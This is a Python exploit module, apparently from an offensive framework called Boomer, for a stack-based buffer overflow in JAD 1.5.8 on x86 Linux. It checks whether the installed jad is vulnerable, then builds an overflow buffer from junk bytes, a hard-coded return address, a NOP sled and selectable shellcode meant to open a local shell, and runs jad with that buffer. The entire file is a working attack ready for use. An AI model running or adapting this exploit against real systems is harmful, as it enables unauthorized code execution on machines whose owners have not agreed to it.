from subprocess import call, Popen, PIPE
from os import errno
from module_payload import PayloadModule


class BoomerModule(PayloadModule):
    def __init__(self):
        info = {"Name": "JAD Buffer Overflow",
                "Module Author": "Josue Encinar",
                "Exploit Author": "Juan Sacco",
                "Description": "JAD 1.5.8 Stack-Based Buffer Overflow",
                "Reference": "https://www.exploit-db.com/exploits/42076/",
                "Arch" : "X86"
                }
        options = {}
        compatible = ["local/linux/x86/open_local_shell"]
        super(BoomerModule, self).__init__(options,info, compatible)
               
    def check(self):
        try:
            response = Popen(["jad"], stdout=PIPE, stderr=PIPE).communicate()[0]
            if b"v1.5.8e" in response:
                self.print_ok("Vulnerable")
            else:
                self.print_error("No Vulnerable")
        except:
            self.print_error("JAD no found")

    def run(self):
        junk = b"\x41" * 8150
        nops = b"\x90" * 24
        payload = self.options["payload"][1]
        if not payload:
            self.print_info("Select a payload -> put payload <option>")
            return
        else:
            shellcode = self.payload.get_shellcode()

        esp = b"\x18\x2e\x0e\x08" 
        buffer = junk + esp + nops + shellcode
        try:
            self.print_info("Trying to Overflow JAD")
            call(["jad", buffer])
        except Exception as e:
            self.print_error(e)
